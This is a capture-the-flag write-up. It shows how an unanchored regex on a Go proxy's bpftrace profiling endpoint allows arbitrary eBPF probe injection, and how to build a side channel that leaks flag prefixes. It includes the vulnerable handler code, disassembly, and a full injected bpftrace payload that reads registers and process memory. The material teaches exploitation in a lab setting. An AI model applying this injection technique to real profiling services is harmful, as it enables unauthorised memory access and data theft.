# Totally Not Brute Force Writeup

The challenge consists of two services: a proxy the player can interact with 
and the flagservers responsible for verifying the flag. The players can only 
communicate with the proxy service and the flagservers are not directly 
accessible.

Each flagserver is responsible for verifying a prefix of the flag increasing in 
length. The proxy handles players' request to check whether the flag is 
correct, queries all flagservers and combines their responses.

The proxy service has three endpoints and all of them an be accessed by the 
players.

The `/status` endpoint is the least interesting one, since it only checks the 
connectivity of all of the services and can be used in a healthcheck.

The `/` endpoint handles the flag checking logic, calls the flagservers over 
gRPC and combines the responses from them.

```go
params := r.URL.Query()
f, ok := params["flag"]
if !ok || len(f) < 1 {
    w.WriteHeader(http.StatusOK)
    fmt.Fprint(w, index)
    return
}

result := true
for _, client := range clients {
    req := &proto.CheckFlagRequest{Flag: f[0]}
    res, err := client.CheckFlag(r.Context(), req)
    if err != nil {
        log.Println("error while checking flag:", err, "request:", req)
        w.WriteHeader(http.StatusInternalServerError)
        return
    }

    result = result && res.GetOk()
}

if result {
    w.WriteHeader(http.StatusOK)
    fmt.Fprintln(w, "ok")
    return
}

w.WriteHeader(http.StatusForbidden)
```

It is possible to deduce from the proxy configuration that the flag is 20 
character long. All flagservers are always called and the response is combined 
in a way that should make timing attacks impossible, so some side-channel is 
needed to make solving this challenge better than brute force.

The `/profile` handler runs a profiler called 
[`bpftrace`](https://github.com/iovisor/bpftrace) to collect the stack traces 
for the user-controlled duration (with the default being 5 seconds).

```go
params := r.URL.Query()

timeout := "5"
if ts, ok := params["t"]; ok && len(ts) > 0 {
    timeout = ts[0]
}

if !pattern.Match([]byte(timeout)) {
    log.Println(timeout, "did not match the pattern")
    w.WriteHeader(http.StatusInternalServerError)
    return
}

f, err := os.CreateTemp("", "probe*.bt")
if err != nil {
    log.Println("can't write a temporary file", err)
    w.WriteHeader(http.StatusInternalServerError)
    return
}
defer os.Remove(f.Name())

s := "interval:s:" + timeout + " { exit() } profile:hz:99 /pid == $1/ { @[ustack] = count() }\n"
f.WriteString(s)
f.Close()
```

The timeout parameter needs to pass a validation for numeric values, but the 
regexp is not anchored, so any user controlled input can be smuggled as long as 
it contains a single digit.

This enables inserting arbitrary probes (breakpoints) into the kernel or 
userspace and execute eBPF programs when they are hit. Unfortunately for the 
player the flagservers do not run on the same kernel the proxy does and the 
flag cannot be extracted directly from them.

The ability to inject arbitrary probes enables the players to construct a side 
channel by inserting a breakpoint right after the call to `res.GetOk()`.

The function handling flag checking is compiled as `main.main.func2`. 
Disassembling it in Delve yields the following snippet:

```
main.go:90      0x88b6bf        0fb64c243f              movzx ecx, byte ptr 
[rsp+0x3f]
main.go:90      0x88b6c4        84c9                    test cl, cl
main.go:90      0x88b6c6        740f                    jz 0x88b6d7
flag.pb.go:111  0x88b6c8        4885c0                  test rax, rax
flag.pb.go:111  0x88b6cb        7406                    jz 0x88b6d3
flag.pb.go:112  0x88b6cd        0fb64828                movzx ecx, byte ptr [rax+0x28]
main.go:90      0x88b6d1        eb06                    jmp 0x88b6d9
main.go:90      0x88b6d3        31c9                    xor ecx, ecx
main.go:90      0x88b6d5        eb02                    jmp 0x88b6d9
```

Breaking at `0x88b6d1` (`main.main.func2+657`) and inspecting the `cx` register 
leaks information whether the checked prefix was correct or not.

Since arbitrary memory can be accessed from the probe, the payload can also 
dump the prefix that was sent in the HTTP2 request, it only requires chasing 
a bunch of pointers.

The payload is designed to check multiple prefixes, which means that it needs 
to implement a counter. The state can be shared between probes by using BPF 
maps, however they need to be keyed by something. Using the thread ID doesn't 
work in Go and instead the goroutines need to be deanonymised to correctly 
trace the hit counts. Luckily `runtime.execute` function is always called 
before a goroutine is scheduled with a pointer to `g` struct, which is enough 
for our purposes. Full tracer payload can be found below:

```
2137 /1==0/ {}
uprobe:{{ .ExePath }}:runtime.execute {
  @gids[tid] = reg("ax");
}
uprobe:{{ .ExePath }}:main.main.func2 {
  $gid = @gids[tid];
  delete(@hit[$gid]);
}
uprobe:{{ .ExePath }}:main.main.func2+657 /reg("cx") != 0/ {
  $gid = @gids[tid];
  @hit[$gid]++;
  if (@hit[$gid] != {{ .Iter }}) { return; }

  $sp = reg("sp");
  $ptr = $sp + 96;
  printf("XXXX %r XXXX\n", buf(**$ptr, *(*$ptr+8)));
  exit();
}
//
```

The tracer payload will exit after the correct prefix is found, so it can be 
ran in the background while the requests brute-forcing the prefix are ran in 
parallel. After repeatedly running it to extract each prefix, the full flag is 
obtained.

Full solver is available in `main.go` and it needs approximately 30 minutes to 
extract the flag.
